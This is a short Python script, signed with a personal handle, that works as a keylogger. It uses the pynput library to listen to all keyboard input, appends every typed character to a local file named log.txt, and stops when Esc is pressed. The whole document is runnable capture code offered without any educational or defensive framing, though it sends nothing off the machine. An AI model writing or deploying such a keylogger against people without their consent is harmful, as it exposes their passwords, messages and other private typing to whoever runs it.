# @osmanmuratgul
from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
